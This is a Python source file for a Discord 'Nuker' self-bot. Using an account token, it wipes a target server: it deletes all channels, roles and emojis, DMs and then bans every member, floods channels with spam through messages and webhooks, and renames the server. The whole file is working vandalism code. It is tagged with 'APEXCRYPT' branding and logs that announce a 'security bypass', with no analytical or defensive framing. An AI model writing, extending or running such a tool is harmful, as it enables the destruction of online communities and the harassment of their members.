class Nuker:
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = int(guild_id)
        self.bot = commands.Bot(command_prefix="!", self_bot=True)
        self.session = None
        self.headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        self.ban_reason = "APEXCRYPT NX10"
        self.dm_template = "[{user}] {reason}"

    async def start_session(self):
        self.session = aiohttp.ClientSession(headers=self.headers)

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def raw_ban(self, guild_id, user_id, reason):
        try:
            async with self.session.put(
                f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}",
                json={"delete_message_days": 0, "reason": reason}
            ) as r:
                return r.status in (200, 204)
        except:
            return False

    async def mass_ban(self, guild, reason=None, dm_text=None):
        reason = reason or self.ban_reason
        dm_text = dm_text or self.dm_template
        members = [m for m in guild.members if m.id != self.bot.user.id]
        print(f"{Fore.RED}[!] Mass Ban + DM → {len(members)} targets (bypass mode)")
        sem = asyncio.Semaphore(60)

        async def ban_one(member):
            async with sem:
                try:
                    msg = dm_text.replace("{user}", str(member)).replace("{reason}", reason)
                    await member.send(msg)
                    await radar.log_dm()
                except:
                    pass
                try:
                    await guild.ban(member, reason=reason, delete_message_days=0)
                    await radar.log_ban(member)
                except:
                    if await self.raw_ban(guild.id, member.id, reason):
                        await radar.log_ban(member)

        await asyncio.gather(*[ban_one(m) for m in members], return_exceptions=True)

    async def mass_channel_create(self, guild, prefix, amount):
        print(f"{Fore.GREEN}[!] Channel create x{amount} prefix={prefix}")
        sem = asyncio.Semaphore(45)

        async def create_one(i):
            async with sem:
                name = f"{prefix}-{i}" if amount > 1 else prefix
                try:
                    ch = await guild.create_text_channel(name)
                    await radar.log_channel("create", ch.name)
                except:
                    try:
                        async with self.session.post(
                            f"https://discord.com/api/v9/guilds/{guild.id}/channels",
                            json={"name": name, "type": 0}
                        ) as r:
                            if r.status == 201:
                                data = await r.json()
                                await radar.log_channel("create", data.get("name", name))
                    except:
                        pass

        await asyncio.gather(*[create_one(i) for i in range(amount)], return_exceptions=True)

    async def mass_channel_delete(self, guild):
        channels = list(guild.channels)
        print(f"{Fore.YELLOW}[!] Deleting {len(channels)} channels")
        sem = asyncio.Semaphore(50)

        async def del_one(ch):
            async with sem:
                try:
                    await ch.delete()
                    await radar.log_channel("delete", getattr(ch, "name", str(ch.id)))
                except:
                    try:
                        async with self.session.delete(f"https://discord.com/api/v9/channels/{ch.id}") as r:
                            if r.status in (200, 204):
                                await radar.log_channel("delete", getattr(ch, "name", str(ch.id)))
                    except:
                        pass

        await asyncio.gather(*[del_one(c) for c in channels], return_exceptions=True)

    async def mass_role_create(self, guild, prefix, amount):
        print(f"{Fore.MAGENTA}[!] Role create x{amount}")
        sem = asyncio.Semaphore(35)

        async def create_one(i):
            async with sem:
                name = f"{prefix}-{i}"
                try:
                    role = await guild.create_role(name=name, colour=discord.Colour.random())
                    await radar.log_role("create", role.name)
                except:
                    try:
                        async with self.session.post(
                            f"https://discord.com/api/v9/guilds/{guild.id}/roles",
                            json={"name": name, "color": random.randint(0, 0xFFFFFF)}
                        ) as r:
                            if r.status == 200:
                                data = await r.json()
                                await radar.log_role("create", data.get("name", name))
                    except:
                        pass

        await asyncio.gather(*[create_one(i) for i in range(amount)], return_exceptions=True)

    async def mass_role_delete(self, guild):
        roles = [r for r in guild.roles if r.name != "@everyone" and not r.managed]
        print(f"{Fore.YELLOW}[!] Deleting {len(roles)} roles")
        sem = asyncio.Semaphore(40)

        async def del_one(role):
            async with sem:
                try:
                    await role.delete()
                    await radar.log_role("delete", role.name)
                except:
                    try:
                        async with self.session.delete(
                            f"https://discord.com/api/v9/guilds/{guild.id}/roles/{role.id}"
                        ) as r:
                            if r.status in (200, 204):
                                await radar.log_role("delete", role.name)
                    except:
                        pass

        await asyncio.gather(*[del_one(r) for r in roles], return_exceptions=True)

    async def mass_emoji_create(self, guild, prefix, amount):
        tiny_png = base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
        )
        print(f"{Fore.CYAN}[!] Emoji create x{amount}")
        sem = asyncio.Semaphore(15)

        async def create_one(i):
            async with sem:
                name = f"{prefix}{i}"[:32]
                try:
                    emoji = await guild.create_custom_emoji(name=name, image=tiny_png)
                    await radar.log_emoji("create", emoji.name)
                except:
                    pass

        await asyncio.gather(*[create_one(i) for i in range(amount)], return_exceptions=True)

    async def mass_emoji_delete(self, guild):
        emojis = list(guild.emojis)
        print(f"{Fore.YELLOW}[!] Deleting {len(emojis)} emojis")
        for e in emojis:
            try:
                await e.delete()
                await radar.log_emoji("delete", e.name)
            except:
                pass

    async def mass_message_spam(self, guild, content, amount_per_channel):
        channels = [c for c in guild.text_channels]
        print(f"{Fore.YELLOW}[!] Msg spam {amount_per_channel}/ch × {len(channels)} channels (ultra)")
        sem = asyncio.Semaphore(80)

        async def spam_ch(ch):
            for _ in range(amount_per_channel):
                async with sem:
                    try:
                        await ch.send(content)
                        await radar.log_msg()
                    except:
                        try:
                            async with self.session.post(
                                f"https://discord.com/api/v9/channels/{ch.id}/messages",
                                json={"content": content}
                            ) as r:
                                if r.status == 200:
                                    await radar.log_msg()
                        except:
                            pass

        await asyncio.gather(*[spam_ch(c) for c in channels], return_exceptions=True)

    async def webhook_spam(self, guild, content, amount):
        channels = [c for c in guild.text_channels]
        print(f"{Fore.CYAN}[!] Webhook spam x{amount}")
        for ch in channels:
            try:
                wh = await ch.create_webhook(name="APEXCRYPT")
                await radar.log_webhook()
                for _ in range(amount):
                    await wh.send(content)
                    await radar.log_msg()
                await wh.delete()
            except:
                pass

    async def rename_server(self, guild, new_name):
        try:
            await guild.edit(name=new_name)
            print(f"{Fore.GREEN}[+] Server name → {new_name}")
        except Exception as e:
            print(f"{Fore.RED}[-] Rename failed: {e}")

    async def change_vanity(self, guild, code):
        try:
            async with self.session.patch(
                f"https://discord.com/api/v9/guilds/{guild.id}/vanity-url",
                json={"code": code}
            ) as r:
                if r.status == 200:
                    print(f"{Fore.GREEN}[+] Vanity → discord.gg/{code}")
                else:
                    print(f"{Fore.RED}[-] Vanity failed (needs boosts)")
        except:
            print(f"{Fore.RED}[-] Vanity error")

    async def full_nuke(self, guild, cfg):
        print(f"{Fore.RED}[!!!] FULL NUKE ENGAGED — SECURITY BYPASS ACTIVE")
        if cfg.get("del_ch"):
            await self.mass_channel_delete(guild)
        if cfg.get("del_roles"):
            await self.mass_role_delete(guild)
        if cfg.get("del_emojis"):
            await self.mass_emoji_delete(guild)
        if cfg.get("ban"):
            await self.mass_ban(guild, cfg.get("reason"), cfg.get("dm_text"))
        if cfg.get("create_ch"):
            await self.mass_channel_create(guild, cfg.get("ch_prefix", "nuked"), cfg.get("ch_amt", 50))
        if cfg.get("create_roles"):
            await self.mass_role_create(guild, cfg.get("role_prefix", "nuked"), cfg.get("role_amt", 200))
        if cfg.get("create_emojis"):
            await self.mass_emoji_create(guild, cfg.get("emoji_prefix", "nx"), cfg.get("emoji_amt", 30))
        if cfg.get("spam"):
            await self.mass_message_spam(guild, cfg.get("spam_msg", "@everyone APEXCRYPT NX10"), cfg.get("spam_amt", 25))
        if cfg.get("webhook"):
            await self.webhook_spam(guild, cfg.get("spam_msg", "@everyone APEXCRYPT"), cfg.get("wh_amt", 10))
        if cfg.get("rename"):
            await self.rename_server(guild, cfg.get("new_name", "APEXCRYPT NUKED"))
        print(f"{Fore.GREEN}[✓] FULL NUKE COMPLETE")

